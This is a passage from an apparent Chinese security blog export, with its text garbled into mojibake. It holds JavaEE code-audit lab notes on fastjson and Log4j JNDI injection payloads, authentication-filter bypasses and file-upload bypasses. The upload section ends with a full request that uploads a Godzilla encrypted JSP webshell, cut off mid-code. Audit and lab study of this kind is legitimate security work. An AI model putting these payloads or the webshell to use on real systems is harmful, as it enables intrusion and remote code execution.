é‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥æ‰¾äº†èƒ½getNameå’Œæ„é€ æ–¹æ³•èƒ½é€ æˆRCEçš„ç±» æ³¨æ„äº†å¾ˆå…³é”®å’Œå‰é¢è¯´çš„èµ‹å€¼ä¸€æ · æœ¬è´¨æ˜¯ **â€œæ ¹æ® JSON å­—ç¬¦ä¸²åŠ¨æ€åˆ›å»ºå¯¹è±¡å¹¶èµ‹å€¼â€**ï¼Œå®Œå…¨åŸºäºåå°„å®ç°ï¼Œä¸ä¾èµ– JDK çš„åºåˆ—åŒ–æœºåˆ¶ æ¯”å¦‚CCçš„åºåˆ—åŒ–æ¥å£ 4ï¼šæ‰¾åˆ°æ¼æ´ç±»åœ¨ä½ ä¼ å…¥çš„æ–‡æœ¬ä¸­fastjsonæ˜¯é€šè¿‡æ¯”å¦‚ä½ ä¼ å…¥ name â€œGodâ€ ä»–ä¼šåŠ ä¸Šgetå¹¶æŠŠé¦–å­—æ¯å¤§å†™æ¥å¯»æ‰¾setæ–¹æ³•æ‰€ä»¥å°±å˜æˆäº† setNameè¢«æ‰§è¡Œäº† å½“ç„¶æ˜¯æœ‰è¿™ä¸ªç±»çš„å°±æ˜¯ JdbcRowSetlmpl è¿›å…¥åè¾“å…¥alt+7æŸ¥çœ‹æ–¹æ³• public void setAutoCommit(boolean var1) throws SQLException if (this.conn != null) this.conn.setAutoCommit(var1); else this.conn = this.connect(); this.conn.setAutoCommit(var1); æˆ‘ä»¬æƒ³è¦è§¦å‘è¿™ä¸ªsetåªéœ€è¦å‚æ•° autoCommitå°±å¯ä»¥äº† æˆ‘ä»¬æ¥è§‚çœ‹è¿™ä¸ªä»£ç  åœ¨trueä¸­æœ‰ä¸€ä¸ªconnectæ–¹æ³• é‡Œé¢ç›´æ¥æœ‰äº†jndiæ³¨å…¥çš„å‡½æ•°ä¸¤æ¡ this.getDataSourceName()æ¢ä¸ºJNDIæ³¨å…¥çš„ä»£ç å°±å¯ä»¥äº† private Connection connect() throws SQLException if (this.conn != null) return this.conn; else if (this.getDataSourceName() != null) try InitialContext var1 = new InitialContext(); DataSource var2 = (DataSource)var1.lookup(this.getDataSourceName()); æ‰€ä»¥æˆ‘ä»¬æ‰‹åŠ¨æ„é€ å€¼ä¼ å…¥å°±å¯ä»¥äº† @type : com.sun.rowset.JdbcRowSetImpl, dataSourceName: ldap://xxxx, autoCommit: true ä¸‰ï¼šLOG4J-jndiæ³¨å…¥1ï¼šæ¡ä»¶ä¸POCä¾èµ–å¦‚ä¸‹å°äº2.14 dependencies dependency groupIdorg.apache.logging.log4j/groupId artifactIdlog4j-core/artifactId version2.14.1/version /dependency dependency groupIdorg.apache.logging.log4j/groupId artifactIdlog4j-api/artifactId version2.14.1/version /dependency/dependenciesæˆ–è€…å¦‚æœä½ æ²¡æœ‰æºç --------------------------?xml version=1.0 encoding=UTF-8?project xmlns=http://maven.apache.org/POM/4.0.0 xmlns:xsi=http://www.w3.org/2001/XMLSchema-instance xsi:schemaLocation=http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd modelVersion4.0.0/modelVersion groupIdcom.yr/groupId artifactIdlog4jjj/artifactId version1.0-SNAPSHOT/version properties maven.compiler.source8/maven.compiler.source maven.compiler.target8/maven.compiler.target project.build.sourceEncodingUTF-8/project.build.sourceEncoding /properties dependencies !-- Log4j æ ¸å¿ƒäºŒè¿›åˆ¶åŒ…ï¼ˆç¼–è¯‘è¿è¡Œå¿…éœ€ï¼‰ -- dependency groupIdorg.apache.logging.log4j/groupId artifactIdlog4j-core/artifactId version2.14.1/version !-- ä¸å¸¦ classifierï¼Œé»˜è®¤æ˜¯äºŒè¿›åˆ¶åŒ… -- /dependency !-- Log4j æ ¸å¿ƒæºç åŒ…ï¼ˆä»…ç”¨äºæŸ¥çœ‹æºç ï¼Œå¯é€‰ï¼‰ -- dependency groupIdorg.apache.logging.log4j/groupId artifactIdlog4j-core/artifactId version2.14.1/version classifiersources/classifier scopeprovided/scope !-- æ ‡è®°ä¸ºâ€œå·²æä¾›â€ï¼Œä¸å‚ä¸æ‰“åŒ… -- /dependency !-- Log4j API äºŒè¿›åˆ¶åŒ…ï¼ˆç¼–è¯‘è¿è¡Œå¿…éœ€ï¼‰ -- dependency groupIdorg.apache.logging.log4j/groupId artifactIdlog4j-api/artifactId version2.14.1/version /dependency !-- Log4j API æºç åŒ…ï¼ˆä»…ç”¨äºæŸ¥çœ‹æºç ï¼Œå¯é€‰ï¼‰ -- dependency groupIdorg.apache.logging.log4j/groupId artifactIdlog4j-api/artifactId version2.14.1/version classifiersources/classifier scopeprovided/scope /dependency /dependencies/project åœ¨resourceä¸‹é¢åˆ›å»ºlog4j2.xml é…ç½®æ–‡ä»¶ ?xml version=1.0 encoding=UTF-8?Configuration status=WARN Appenders !-- è¾“å‡ºåˆ°æ§åˆ¶å° -- Console name=Console target=SYSTEM_OUT PatternLayout pattern=%dHH:mm:ss.SSS [%t] %-5level %logger36 - %msg%n/ /Console /Appenders Loggers !-- æ ¹æ—¥å¿—å™¨ï¼Œçº§åˆ«è®¾ä¸ºINFO -- Root level=info AppenderRef ref=Console/ /Root /Loggers/Configuration ä»£ç å¦‚ä¸‹ $è¡¨ç¤ºé‡Œé¢æ˜¯éœ€è¦è¢«è§£æçš„å˜é‡ jndiï¼šè¡¨ç¤ºç”¨jndiç»„ä»¶å»è§£æ ldapè¡¨ç¤ºjndiæ³¨å…¥åè®®å¦‚rmi import org.apache.logging.log4j.LogManager;import org.apache.logging.log4j.Logger;public class test public static final Logger logger = LogManager.getLogger(test.class); public static void main(String[] args) logger.info(hello world); logger.info($jndi:ldap://xxx); 2ï¼šè·Ÿè¸ªè°ƒè¯•JNDIæ³¨å…¥è¦çœ‹InitialContext.javaä¸‹é¢çš„lookupæ–¹æ³• æˆ‘ä»¬æ‰“ä¸€ä¸ªæ–­ç‚¹ç„¶åè°ƒè¯•å‘ç°ç¡®å®ç»è¿‡äº† å‘ç°å˜é‡è¦†ç›–è¿‡å» é€šè¿‡å˜é‡èµ‹å€¼${}è§£æä¸­é—´æ•°å€¼è°ƒç”¨äº†JNDIlookup å½“å˜é‡è¡¨è¾¾å¼ä»¥ jndi:å¼€å¤´æ—¶ï¼ˆå¦‚${jndi:ldap:â€¦}ï¼‰ï¼ŒLog4j ä¼šè°ƒç”¨ JndiLookupç±»çš„lookupæ–¹æ³•ï¼Œè¯¥ç±»å®ç°äº†Lookup æ¥å£ï¼Œä¸“é—¨å¤„ç† JNDI ç›¸å…³çš„å˜é‡è§£æã€‚ @Overridepublic String lookup(final LogEvent event, final String key) if (key == null) return null; final String jndiName = convertJndiName(key); try (final JndiManager jndiManager = JndiManager.getDefaultManager()) return Objects.toString(jndiManager.lookup(jndiName), null); catch (final NamingException e) LOGGER.warn(LOOKUP, Error looking up JNDI resource []., jndiName, e); return null;","tags":["JavaEE"]},{"title":"JavaEEä»£ç å®¡è®¡-é‰´æƒé€»è¾‘","path":"/2025/10/29/posts/code3javaee/","content":"JavaEEä»£ç å®¡è®¡-é‰´æƒé€»è¾‘ æ‹¦æˆªå™¨\tInterceptoræ˜¯ä¸€ç§æ‹¦æˆªå™¨ï¼Œä¹Ÿç§°ä¹‹ä¸ºæ‹¦æˆªå™¨é“¾ï¼ˆInterceptor Chainï¼‰ï¼Œä¸»è¦ç”¨äºæ‹¦æˆªè¯·æ±‚ã€å“åº”æˆ–å¤„ç†è¿‡ç¨‹ä¸­çš„æŸäº›äº‹ä»¶ï¼Œæ¯”å¦‚æƒé™è®¤è¯ã€æ—¥å¿—è®°å½•ã€æ€§èƒ½æµ‹è¯•ç­‰ã€‚åœ¨ Java ä¸­ï¼ŒInterceptorå¯ä»¥ç”¨æ¥æ‰©å±•æ¡†æ¶ï¼Œå¢åŠ æˆ–ä¿®æ”¹æŸä¸ªæ–¹æ³•çš„è¡Œä¸ºï¼Œæˆ–è€…å¯¹åº”ç”¨æµç¨‹åšäº›å‰ç½®å¤„ç†ã€åç½®å¤„ç†ã€ç¯ç»•å¤„ç†ç­‰ã€‚è¿‡æ»¤å™¨\tFilterè¢«ç§°ä¸ºè¿‡æ»¤å™¨ï¼Œè¿‡æ»¤å™¨å®é™…ä¸Šå°±æ˜¯å¯¹Webèµ„æºè¿›è¡Œæ‹¦æˆªï¼Œåšä¸€äº›å¤„ç†åå†äº¤ç»™ä¸‹ä¸€ä¸ªè¿‡æ»¤å™¨æˆ–Servletå¤„ç†ï¼Œé€šå¸¸éƒ½æ˜¯ç”¨æ¥æ‹¦æˆªrequestè¿›è¡Œå¤„ç†çš„ï¼Œä¹Ÿå¯ä»¥å¯¹è¿”å›çš„ responseè¿›è¡Œæ‹¦æˆªå¤„ç†ã€‚å¼€å‘äººå‘˜åˆ©ç”¨filteræŠ€æœ¯ï¼Œå¯ä»¥å®ç°å¯¹æ‰€æœ‰Webèµ„æºçš„ç®¡ç†ï¼Œä¾‹å¦‚å®ç°æƒé™è®¿é—®æ§åˆ¶ã€è¿‡æ»¤æ•æ„Ÿè¯æ±‡ã€å‹ç¼©å“åº”ä¿¡æ¯ç­‰ä¸€äº›é«˜çº§åŠŸèƒ½ã€‚ä¸æ˜¯åœ¨ä»£ç ä¸­ ä»–è¿™æ˜¯ç½‘ç«™å¯åŠ¨å°±å¼€å§‹äº†å¥½å¤„ï¼š\tå‡å°‘ä»£ç é‡å¤æ€§ï¼š\tå…¨å±€ç»Ÿä¸€å¤„ç†ï¼š\tæå‰æ‹¦æˆªï¼Œæå‡æ€§èƒ½ï¼š æ‹¦æˆªå™¨åœ¨è¯·æ±‚åˆ°è¾¾ä¸šåŠ¡ä»£ç ï¼ˆå¦‚ Controllerã€Serviceï¼‰ä¹‹å‰å°±æ‹¦æˆªéæ³•è¯·æ±‚ï¼ˆå¦‚æœªç™»å½•ã€å‚æ•°æ ¼å¼é”™è¯¯ï¼‰ï¼Œé¿å…æ— æ•ˆçš„ä¸šåŠ¡å¤„ç†ï¼Œå‡å°‘æœåŠ¡å™¨èµ„æºæ¶ˆè€—ã€‚ æ¨èä¸¤ä¸ªè¿›è¡Œäº’è¡¥ é€šå¸¸å»ºè®® **â€œæ‹¦æˆªå™¨åšå…¨å±€é€šç”¨æ ¡éªŒï¼Œä»£ç åšä¸šåŠ¡ä¸“å±æ ¡éªŒâ€**ï¼Œä¼˜åŠ¿äº’è¡¥ï¼š æ¡ˆä¾‹ä¸€ï¼šnewbee-mall-å¯ä»¥å‘ç°æºç ä¸­è¿™ç§è¿‡æ»¤å™¨çš„ä»£ç è€Œä¸”å†™äº†æ˜¯adminå­—æ®µçš„è¿‡æ»¤ preHandleæ˜¯å›ºå®šçš„å†™æ³•å’Œdofilterä¸€æ ·ä¸æ˜¯è‡ªå·±å®šä¹‰çš„ ä¼˜å…ˆæŸ¥çœ‹ä»£ç @Override public boolean preHandle(HttpServletRequest request, HttpServletResponse response, Object o) throws Exception String uri = request.getRequestURI(); if (uri.startsWith(/admin) null == request.getSession().getAttribute(loginUser)) request.getSession().setAttribute(errorMsg, è¯·ç™»é™†); response.sendRedirect(request.getContextPath() + /admin/login); return false; else request.getSession().removeAttribute(errorMsg); return true; preHandleï¼šè¯·æ±‚å¤„ç†ä¹‹å‰æ‰§è¡Œï¼ˆå¦‚ç™»å½•æ ¡éªŒã€æƒé™åˆ¤æ–­ï¼‰ï¼› postHandleï¼šè¯·æ±‚å¤„ç†ä¹‹åã€è§†å›¾æ¸²æŸ“ä¹‹å‰æ‰§è¡Œï¼ˆå¦‚ä¿®æ”¹æ¨¡å‹æ•°æ®ã€æ·»åŠ å…¨å±€å‚æ•°ï¼‰ï¼› afterCompletionï¼šæ•´ä¸ªè¯·æ±‚å®Œæˆåæ‰§è¡Œï¼ˆå¦‚èµ„æºæ¸…ç†ã€æ—¥å¿—è®°å½•ï¼‰ã€‚ ç»•è¿‡æ–¹æ³• /;/adminæˆ–//admin admin åŒ¹é…å°±ä¸ºç©ºäº†å°±é¥¶è¿‡äº†é€»è¾‘ ä½†æ˜¯åˆæ­£å¸¸è§£æadminç•Œé¢ ;admin åˆ†å· ; åœ¨ URI ä¸­æ˜¯ â€œè·¯å¾„å‚æ•°åˆ†éš”ç¬¦â€ï¼ˆRFC è§„èŒƒï¼‰ï¼ŒæœåŠ¡å™¨ä¼šå¿½ç•¥åˆ†å·åŠåç»­å†…å®¹ï¼ˆæˆ–ä»…ä½œä¸ºå‚æ•°å¤„ç†ï¼‰ï¼Œå› æ­¤ /;/admin ä¼šè¢«è§„èŒƒåŒ–ä¸º /adminï¼Œå®é™…è®¿é—®çš„æ˜¯ /admin èµ„æº æ¡ˆä¾‹äºŒï¼šmedicine-mangementç³»ç»Ÿyiyaoguanlixitongadmindistindex.html#login ä»£ç è¯´æ˜äº† æœ‰è¿™ä¸‰ä¸ªå¼€å¤´åˆ™æ”¾è¡Œ/dictionary/page/file/upload/yonghu/registerIgnoreAuth å¸¦æœ‰è¿™ä¸ªçš„ç›´æ¥æ”¾è¡Œ æ¯”å¦‚ è®¿é—®Loginä¸éœ€è¦é‰´æƒ @IgnoreAuth @RequestMapping(value = /login) public R login(String username, String password, String captcha, HttpServletRequest request) YuangongEntity yuangong = yuangongService.selectOne(new EntityWrapperYuangongEntity().eq(username, username)); if(yuangong==null || !yuangong.getPassword().equals(password)) return R.error(è´¦å·æˆ–å¯†ç ä¸æ­£ç¡®); @Override public boolean preHandle(HttpServletRequest request, HttpServletResponse response, Object handler) throws Exception String servletPath = request.getServletPath(); if(/dictionary/page.equals(request.getServletPath()) || /file/upload.equals(request.getServletPath()) || /yonghu/register.equals(request.getServletPath()) )//è¯·æ±‚è·¯å¾„æ˜¯å­—å…¸è¡¨æˆ–è€…æ–‡ä»¶ä¸Šä¼  ç›´æ¥æ”¾è¡Œ return true; //æ”¯æŒè·¨åŸŸè¯·æ±‚ response.setHeader(Access-Control-Allow-Methods, POST, GET, OPTIONS, DELETE); response.setHeader(Access-Control-Max-Age, 3600); response.setHeader(Access-Control-Allow-Credentials, true); response.setHeader(Access-Control-Allow-Headers, x-requested-with,request-source,Token, Origin,imgType, Content-Type, cache-control,postman-token,Cookie, Accept,authorization); response.setHeader(Access-Control-Allow-Origin, request.getHeader(Origin)); IgnoreAuth annotation; if (handler instanceof HandlerMethod) annotation = ((HandlerMethod) handler).getMethodAnnotation(IgnoreAuth.class); else return true; //ä»headerä¸­è·å–token String token = request.getHeader(LOGIN_TOKEN_KEY); /** * ä¸éœ€è¦éªŒè¯æƒé™çš„æ–¹æ³•ç›´æ¥æ”¾è¿‡ */ if(annotation!=null) return true; http://192.168.56.1:8080/yiyaoguanlixitong/file/upload/../../admin/dist/index.html æ¯”å¦‚æˆ‘ä»¬æ‰¾åˆ°äº†ä¸€ä¸ªusersä¸‹é¢çš„resetpass å› ä¸ºå®ƒæ˜¯å¸¦IgnoreAuthçš„ è€Œä¸”ç›´æ¥GETä¼ å…¥usernameç›´æ¥è¶Šæƒ IgnoreAuth@RequestMapping(value = /resetPass) public R resetPass(String username, HttpServletRequest request) UsersEntity user = usersService.selectOne(new EntityWrapperUsersEntity().eq(username, username)); if(user==null) return R.error(è´¦å·ä¸å­˜åœ¨); user.setPassword(123456); usersService.update(user,null); return R.ok(å¯†ç å·²é‡ç½®ä¸ºï¼š123456); æ¡ˆä¾‹ä¸‰ï¼šåå¤ERP-è¿‡æ»¤å™¨initæ˜¯åˆå§‹åŒ–ä¸ç”¨çœ‹ä¸»è¦çœ‹DOFILTER requestUrl ! null (requestUrl.contains(â€œlogin.htmlâ€) || requestUrl.contains(â€œregister.html çœ‹è¿™ä¸ªå¦‚æœæœ‰register.htmlå°±å¯ä»¥äº†é‚£ä¹ˆæˆ‘ä»¬ç›´æ¥æ„é€ è·³è¿‡å°±è¡Œäº† @Overridepublic void doFilter(ServletRequest request, ServletResponse response, FilterChain chain) throws IOException, ServletException HttpServletRequest servletRequest = (HttpServletRequest) request; HttpServletResponse servletResponse = (HttpServletResponse) response; String requestUrl = servletRequest.getRequestURI(); //å…·ä½“ï¼Œæ¯”å¦‚ï¼šå¤„ç†è‹¥ç”¨æˆ·æœªç™»å½•ï¼Œåˆ™è·³è½¬åˆ°ç™»å½•é¡µ Object userInfo = servletRequest.getSession().getAttribute(user); if(userInfo!=null) //å¦‚æœå·²ç™»å½•ï¼Œä¸é˜»æ­¢ chain.doFilter(request, response); return; if (requestUrl != null (requestUrl.contains(/login.html) || requestUrl.contains(/register.html))) chain.doFilter(request, response); return; if (verify(ignoredList, requestUrl)) chain.doFilter(servletRequest, response); return; if (null != allowUrls allowUrls.length 0) for (String url : allowUrls) if (requestUrl.startsWith(url)) chain.doFilter(request, response); return; accountgetAccount æµè§ˆå™¨ä¸è¡Œæ¢BPå¯ä»¥ åŒæ—¶ä»–è¿˜åˆ¤æ–­è¯·æ±‚JS CSSå¯ä»¥ initParams = @WebInitParam(name = ignoredUrl, value = .css#.js#.jpg#.png#.gif#.ico), @WebInitParam(name = filterPath,if (verify(ignoredList, requestUrl)) chain.doFilter(servletRequest, response); return; æ¡ˆä¾‹å››ï¼šå¤©çŒ«-è¿‡æ»¤å™¨ç›´æ¥....ç»•è¿‡å°±è¡Œäº† @Overridepublic void doFilter(ServletRequest request, ServletResponse response, FilterChain chain) throws IOException, ServletException HttpServletRequest servletRequest = (HttpServletRequest) request; //å¦‚æœæ˜¯(ç™»å½•ç•Œé¢,ç™»å½•æ€å¤±æ•ˆç•Œé¢)ï¼Œç›´æ¥æ”¾è¡Œ if(servletRequest.getRequestURI().contains(/admin/login) || servletRequest.getRequestURI().contains(/admin/account) ) chain.doFilter(request, response); else logger.info(æ£€æŸ¥ç®¡ç†å‘˜æƒé™); Object o = servletRequest.getSession().getAttribute(adminId); if(o == null) logger.info(æ— ç®¡ç†æƒé™ï¼Œè¿”å›ç®¡ç†å‘˜ç™»é™†é¡µ); request.getRequestDispatcher(/admin/login).forward(request, response); else logger.info(æƒé™éªŒè¯æˆåŠŸï¼Œç®¡ç†å‘˜IDï¼š,o); chain.doFilter(request, response);","tags":["JavaEE"]},{"title":"JavaEEä»£ç å®¡è®¡-æ–‡ä»¶æ“ä½œ","path":"/2025/10/23/posts/code2javaee/","content":"JavaEEä»£ç å®¡è®¡-æ–‡ä»¶å‡½æ•° æ–‡ä»¶å‡½æ•°1ï¼šæœç´¢ç±»åˆ«2ï¼šæœç´¢åŠŸèƒ½ç‚¹æ¥æ‰¾åˆ°ä»£ç new File(String pathString fileNamenew FileInputStream(new FileOutputStream(new FileReaderresponse.setContentType(application/octet-stream;file.delete();FileUtils.new ZipEntity(file.getName(.unzip(.mkdirs(stream.write(save2File(fosã€fis.close()MultipartFile(file.getOriginalFilename(IOUtilFileUtildownloadfileNamefilePathwritegetFilegetPathgetWriterä¸Šä¼  // æœæ³¨é‡Šä¸‹è½½ // æœæ³¨é‡Š æ¡ˆä¾‹ä¸€ï¼š inxeduæ•™è‚²ç³»ç»Ÿ-æ–‡ä»¶ä¸Šä¼ é»‘åå•æ ¡éªŒæ­å»ºæ³¨æ„mysqlç‰ˆæœ¬é€‰æ‹©ä½ä¸€ç‚¹çš„5.0 å¹¶ä¸”tomcaté‡Œé¢çš„å·¥ä»¶è·¯å¾„æ˜¯æ ¹ç›®å½• è¿™é‡Œç™»å½•ç”¨127.0.0.1 ç™»å½•ç”¨æˆ·å¯†ç ç™»å½•ä¸Šå»äº†ç”¨localhostä¸å¯ä»¥ä¸çŸ¥é“ä¸ºä»€ä¹ˆ é€šè¿‡åŠŸèƒ½ç‚¹æ‰¾åˆ°ä»£ç ç‚¹â€“å‘ç°æ–‡ä»¶ä¸Šä¼ æµ‹è¯•ç‚¹ http://127.0.0.1:82/image/gok4?param=tempfileType=jpg,gif,png,jpeg æ•°æ®åŒ…å¦‚ä¸‹ param=tempfileType=jpg,gif,png,jpeg------WebKitFormBoundary7JcghSZ4pcHSbNEtContent-Disposition: form-data; name=uploadfile; filename=44.jpgContent-Type: image/jpeg------WebKitFormBoundary7JcghSZ4pcHSbNEt-- ä½†æ˜¯ä¸Šä¼ çš„ä»£ç æˆ‘ä»¬ä¸€ç›´æ²¡æœ‰æ‰¾åˆ°å•Š æœ€åå‘ç°åœ¨jaråŒ…é‡Œé¢ æ‰€ä»¥æˆ‘ä»¬æ‰¾ä¸åˆ°çš„æ—¶å€™å¯ä»¥çœ‹çœ‹jaråŒ… demo_inxedu_open\\src\\main\\webapp\\WEB-INF\\lib\\inxedu-jar.jar!\\com\\inxedu\\os\\common\\controller\\ImageUploadController.class å¯ä»¥å‘ç°ä¸‹é¢ä»£ç ç”¨çš„æ˜¯é»‘åå•è¿‡æ»¤,é€šè¿‡æ‹¿åˆ°åç¼€æ¯”å¯¹æ˜¯å¦æœ‰jspæ¥åˆ¤æ–­ä½†æ˜¯JSPå’Œphpä¸€æ · æ¯”å¦‚php5ä¸€æ ·å¯ä»¥æ‰§è¡ŒJSPä¹Ÿæ˜¯ä¸€æ ·çš„æœ‰JSPXåœ¨å“¥æ–¯æ‹‰ç”Ÿæˆåç¼€ä¸­ ä½†æ˜¯ä¸Šä¼ æ³¨æ„ä»–æ˜¯jpg,gif,png,jpeg åŒ…å«ä¸Šä¼ çš„åé—¨æ‰€ä»¥æˆ‘ä»¬åœ¨è¿™åé¢ä¹Ÿè¦åŠ ä¸Šjspx @RequestMapping( value = /gok4, method = RequestMethod.POST ) public String gok4(HttpServletRequest request, HttpServletResponse response, @RequestParam(value = uploadfile,required = true) MultipartFile uploadfile, @RequestParam(value = param,required = false) String param, @RequestParam(value = fileType,required = true) String fileType, @RequestParam(value = pressText,required = false) String pressText) try long maxSize = 4096000L; System.out.println(uploadfile.getSize()); if (uploadfile.getSize() maxSize) return this.responseErrorData(response, 1, ä¸Šä¼ çš„å›¾ç‰‡å¤§å°ä¸èƒ½è¶…è¿‡4Mã€‚); else String[] type = fileType.split(,); this.setFileTypeList(type); String ext = FileUploadUtils.getSuffix(uploadfile.getOriginalFilename()); if (fileType.contains(ext) !jsp.equals(ext)) String filePath = this.getPath(request, ext, param); File file = new File(this.getProjectRootDirPath(request) + filePath); if (!file.getParentFile().exists()) file.getParentFile().mkdirs(); uploadfile.transferTo(file); return this.responseData(filePath, 0, ä¸Šä¼ æˆåŠŸ, response); else return this.responseErrorData(response, 1, æ–‡ä»¶æ ¼å¼é”™è¯¯ï¼Œä¸Šä¼ å¤±è´¥ã€‚); ä¿®å¤ ä¸ä¿¡ä»»å®¢æˆ·ç«¯è¾“å…¥ï¼šç¡¬ç¼–ç å…è®¸çš„æ–‡ä»¶ç±»å‹ï¼Œæ‹’ç»æ‰€æœ‰è„šæœ¬åç¼€ï¼›ç™½åå• éªŒè¯æ–‡ä»¶æœ¬è´¨ï¼šé€šè¿‡æ–‡ä»¶å¤´å’Œå†…å®¹åˆ¤æ–­çœŸå®ç±»å‹ï¼Œè€Œéä»…ä¾èµ–åç¼€ï¼› éš”ç¦»å±é™©æ–‡ä»¶ï¼šé‡å‘½åæ–‡ä»¶ï¼Œç¦æ­¢ä¸Šä¼ ç›®å½•çš„è„šæœ¬è§£æï¼› é™åˆ¶è®¿é—®å’Œé¢‘ç‡ï¼šé˜²æ­¢æ¶æ„ç”¨æˆ·æ»¥ç”¨ä¸Šä¼ åŠŸèƒ½ã€‚ ä¿®å¤:ä½¿ç”¨ç™½åå•æ ¡éªŒ æ¡ˆä¾‹äºŒï¼šå¤©çŒ«tmall-å‰ç«¯æ ¡éªŒ-ç»•è¿‡é‰´æƒ é¦–å…ˆåœ¨adminç•Œé¢æ‰¾åˆ°ä¸Šä¼ ç‚¹ é€šè¿‡F12æ‰¾åˆ°åç«¯æ¥å£ tmalladminuploadAdminHeadImage æºç å¦‚ä¸‹å°±æ˜¯ä¸Šä¼ æäº¤ä¸€ä¸ªMuilå›¾ç‰‡æ•°æ®è·å–åç¼€éšæœºç”Ÿæˆéšæœºåå­— æ³¨æ„æ²¡æœ‰è¿›è¡Œè¿‡æ»¤@ResponseBody@RequestMapping(value = admin/uploadAdminHeadImage, method = RequestMethod.POST, produces = application/json;charset=UTF-8)public String uploadAdminHeadImage(@RequestParam MultipartFile file, HttpSession session) String originalFileName = file.getOriginalFilename(); logger.info(è·å–å›¾ç‰‡åŸå§‹æ–‡ä»¶åï¼š, originalFileName); assert originalFileName != null; String extension = originalFileName.substring(originalFileName.lastIndexOf(.)); //ç”Ÿæˆéšæœºå String fileName = UUID.randomUUID() + extension; //è·å–ä¸Šä¼ è·¯å¾„ String filePath = session.getServletContext().getRealPath(/) + res/images/item/adminProfilePicture/ + fileName; logger.info(æ–‡ä»¶ä¸Šä¼ è·¯å¾„ï¼š, filePath); JSONObject jsonObject = new JSONObject(); try logger.info(æ–‡ä»¶ä¸Šä¼ ä¸­...); file.transferTo(new File(filePath)); logger.info(æ–‡ä»¶ä¸Šä¼ æˆåŠŸï¼); jsonObject.put(success, true); jsonObject.put(fileName, fileName); catch (IOException e) logger.warn(æ–‡ä»¶ä¸Šä¼ å¤±è´¥ï¼); e.printStackTrace(); jsonObject.put(success, false); return jsonObject.toJSONString(); æˆ‘ä»¬ä¸Šä¼ ä¸€ä¸ªå…¶ä»–çš„ä¼šæç¤ºè¯·é€‰æ‹©å›¾ç‰‡ è¿™æ—¶å€™æˆ‘è‡ªå·±åˆ¤æ–­æ˜¯å‰ç«¯æ ¡éªŒæˆ‘ä»¬æœç´¢å…³é”®å­—æ‰¾åˆ°äº†JSæ–‡ä»¶ è¿™åº”è¯¥å°±æ˜¯åªæ˜¯åˆ¤æ–­mimeæ˜¯ä¸æ˜¯imageç„¶åå°±é€šè¿‡function uploadImage(fileDom) //è·å–æ–‡ä»¶ var file = fileDom.files[0]; //åˆ¤æ–­ç±»å‹ var imageType = /^image\\//; if (file === undefined || !imageType.test(file.type)) alert(è¯·é€‰æ‹©å›¾ç‰‡ï¼); return; //åˆ¤æ–­å¤§å° if (file.size 512000) alert(å›¾ç‰‡å¤§å°ä¸èƒ½è¶…è¿‡500Kï¼); return; //æ¸…ç©ºå€¼ $(fileDom).val(); var formData = new FormData(); formData.append(file, file); //ä¸Šä¼ å›¾ç‰‡ $.ajax( url: /tmall/user/uploadUserHeadImage, type: post, data: formData, contentType: false, processData: false, dataType: json, mimeType: multipart/form-data, success: function (data) if (data.success) $(fileDom).prev(img).attr(src,/tmall/res/images/item/userProfilePicture/+data.fileName); $(#user_profile_picture_src_value).val(data.fileName); else alert(å›¾ç‰‡ä¸Šä¼ å¼‚å¸¸ï¼); , beforeSend: function () , error: function () ); è€Œä¸”åç«¯å®Œå…¨æ²¡æœ‰è¿‡æ»¤æ‰€ä»¥æˆ‘ä»¬å°±ä¸Šä¼ ä¸€ä¸ªå›¾ç‰‡ç„¶åä¿®æ”¹ä¸ºJSPåç¼€æ–‡ä»¶ å“¥æ–¯æ‹‰åé—¨POST /tmall/admin/uploadAdminHeadImage HTTP/1.1Host: 192.168.56.1:8088Content-Type: multipart/form-data; boundary=----WebKitFormBoundary2WnYeHXgLweiQ8gEOrigin: http://192.168.56.1:8088Accept-Encoding: gzip, deflateX-Requested-With: XMLHttpRequestAccept: application/json, text/javascript, */*; q=0.01User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36Referer: http://192.168.56.1:8088/tmall/adminAccept-Language: en-US,en;q=0.9Cookie: JSESSIONID=C0DDD52737477BA74E6A776BCB355385; username=admin; Hm_lvt_f6f37dc3416ca514857b78d0b158037e=1760498678; Hm_lvt_1040d081eea13b44d84a4af639640d51=1761036833,1761037048Content-Length: 200------WebKitFormBoundary2WnYeHXgLweiQ8gEContent-Disposition: form-data; name=file; filename=1.jspContent-Type: image/jpeg%! String xc=3c6e0b8a9c15224a; String pass=pass; String md5=md5(pass+xc); class X extends ClassLoaderpublic X(ClassLoader z)super(z);public Class Q(byte[] cb)return super.defineClass(cb, 0, cb.length); public byte[] x(byte[] s,boolean m) tryjavax.crypto.Cipher c=javax.crypto.Cipher.getInstance(AES);c.init(m?1:2,new javax.crypto.spec.SecretKeySpec(xc.getBytes(),AES));return c.doFinal(s); catch (Exception e)return null; public static String md5(String s) String ret = null;try java.security.MessageDigest m;m = java.security.MessageDigest.getInstance(MD5);m.update(s.getBytes(), 0, s.length());ret = new java.math.BigInteger(1, m.digest()).toString(16).toUpperCase(); catch (Exception e) return ret; public static String base64Encode(byte[] bs) throws Exception Class base64;String value = null;try base64=Class.forName(java.util.Base64);Object Encoder = base64.getMethod(getEncoder, null).invoke(base64, null);value = (String)Encoder.getClass().getMethod(encodeToString, new Class[] byte[].class ).invoke(Encoder, new Object[] bs ); catch (Exception e) try base64=Class.forName(sun.misc.BASE64Encoder); Object Encoder = base64.newInstance(); value = (String)Encoder.getClass().getMethod(encode, new Class[] byte[].class ).invoke(Encoder, new Object[] bs ); catch (Exception e2) return value; public static byte[] base64Decode(String bs) throws Exception Class base64;byte[] value = null;try base64=Class.forName(java.util.Base64);Object decoder = base64.getMethod(getDecoder, null).invoke(base64, null);value = (byte[])decoder.getClass().getMethod(decode, new Class[] String.class ).invoke(decoder, new Object[] bs ); catch (Exception e) try base64=Class.forName(sun.misc.BASE64Decoder); Object decoder = base64.newInstance(); value = (byte[])decoder.getClass().getMethod(decodeBuffer, new Class[] String.class ).invoke(decoder, new Object[] bs ); catch (Exception e2) return value; %%trybyte[] data=base64Decode(request.getParameter(pass));data=x(data, false);if (session.getAttribute(payload)==null)session.setAttribute(payload,new X(this.getClass().getClassLoader()).Q(data));elserequest.setAttribute(parameters,data);java.io.ByteArrayOutputStream arrOut=new java.io.ByteArrayOutputStream();Object 